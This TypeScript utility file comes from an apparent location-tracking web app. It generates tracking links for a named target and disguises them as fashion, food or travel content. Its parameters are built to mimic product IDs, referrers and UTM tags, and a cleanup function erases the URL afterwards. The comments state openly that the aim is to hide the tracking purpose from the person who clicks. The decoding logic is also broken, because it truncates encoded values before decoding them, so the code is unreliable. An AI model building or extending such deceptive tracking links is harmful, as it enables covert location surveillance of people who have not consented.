// src/utils/linkGenerator.ts
import type { TrackingLink } from '../types';

// Production URL configuration - UPDATE THIS WITH YOUR ACTUAL VERCEL URL
const PRODUCTION_URL = 'https://location-tracker-app.vercel.app'; // Replace with your actual Vercel URL
const isDev = import.meta.env.DEV;

// Array of innocent-looking URL paths to disguise the tracking purpose
const DISGUISE_PATHS = [
  'fashion', 'style', 'outfit', 'clothes', 'trends', 'beauty', 'makeup',
  'food', 'recipe', 'restaurant', 'cafe', 'menu', 'cooking',
  'music', 'playlist', 'concert', 'artist', 'album', 'song',
  'movie', 'film', 'series', 'show', 'entertainment', 'review',
  'travel', 'destination', 'hotel', 'vacation', 'trip', 'guide',
  'fitness', 'workout', 'health', 'diet', 'yoga', 'exercise',
  'tech', 'gadget', 'phone', 'laptop', 'review', 'specs',
  'game', 'gaming', 'mobile', 'app', 'download', 'play',
  'news', 'article', 'blog', 'story', 'update', 'info',
  'event', 'party', 'celebration', 'invitation', 'join'
];

// Generate random disguise path
const getRandomDisguisePath = (): string => {
  const randomIndex = Math.floor(Math.random() * DISGUISE_PATHS.length);
  return DISGUISE_PATHS[randomIndex];
};

// Generate random product/item name
const getRandomProductName = (): string => {
  const adjectives = ['new', 'hot', 'trending', 'best', 'top', 'amazing', 'cool', 'fresh'];
  const nouns = ['collection', 'style', 'design', 'look', 'trend', 'item', 'piece', 'find'];
  
  const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
  const noun = nouns[Math.floor(Math.random() * nouns.length)];
  
  return `${adj}-${noun}`;
};

export const generateTrackingLink = (targetName: string): TrackingLink => {
    const linkId = `track_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    return {
        id: linkId,
        name: targetName,
        created: new Date(),
        accessed: false,
        accessCount: 0
    };
};

export const createTrackingUrl = (link: TrackingLink): string => {
    // Use production URL when deployed, current URL when in development
    const baseUrl = isDev ? 
        `${window.location.origin}${window.location.pathname}` : 
        PRODUCTION_URL;
    
    // Create disguised URL structure
    const disguisePath = getRandomDisguisePath();
    const productName = getRandomProductName();
    
    // Encode tracking data in a way that looks like normal URL parameters
    const encodedId = btoa(link.id).replace(/[+=]/g, '').substring(0, 12);
    const encodedName = btoa(link.name).replace(/[+=]/g, '').substring(0, 8);
    
    // Create innocent-looking parameters
    const params = new URLSearchParams({
        id: encodedId,           // Looks like product ID
        ref: encodedName,        // Looks like referrer
        utm: 'share',           // Looks like UTM parameter
        v: Date.now().toString().slice(-6) // Looks like version
    });

    // Remove trailing slash and create disguised URL
    const cleanBaseUrl = baseUrl.replace(/\/$/, '');
    return `${cleanBaseUrl}/${disguisePath}/${productName}?${params.toString()}`;
};

export const isValidTrackingLink = (trackId: string): boolean => {
    return trackId.startsWith('track_') && trackId.length > 10;
};

export const extractLinkInfo = (trackId: string) => {
    const parts = trackId.split('_');
    if (parts.length >= 2) {
        const timestamp = parseInt(parts[1]);
        return {
            timestamp,
            createdAt: new Date(timestamp)
        };
    }
    return null;
};

// Enhanced link generation with better security
export const generateSecureTrackingLink = (targetName: string): TrackingLink => {
    const timestamp = Date.now();
    const randomString = Math.random().toString(36).substr(2, 12);
    const linkId = `track_${timestamp}_${randomString}`;

    return {
        id: linkId,
        name: targetName,
        created: new Date(timestamp),
        accessed: false,
        accessCount: 0
    };
};

// Decode tracking parameters from disguised URL
export const decodeTrackingParams = () => {
    const urlParams = new URLSearchParams(window.location.search);
    const encodedId = urlParams.get('id');
    const encodedName = urlParams.get('ref');
    const utm = urlParams.get('utm');
    
    // Only process if it looks like our disguised URL
    if (!encodedId || !encodedName || utm !== 'share') {
        return { trackId: null, name: null };
    }
    
    try {
        // Decode the base64 encoded values
        const trackId = atob(encodedId + '==='); // Add padding if needed
        const name = atob(encodedName + '===');
        
        return {
            trackId: trackId.startsWith('track_') ? trackId : null,
            name: name || null
        };
    } catch (error) {
        console.error('Failed to decode tracking params:', error);
        return { trackId: null, name: null };
    }
};

// Clean up URL after processing
export const cleanupDisguisedUrl = () => {
    // Remove the disguised path and parameters, redirect to clean URL
    const baseUrl = isDev ? 
        `${window.location.origin}${window.location.pathname.split('/')[1] ? '/' + window.location.pathname.split('/')[1] : '/'}` : 
        PRODUCTION_URL;
    
    window.history.replaceState({}, document.title, baseUrl);
};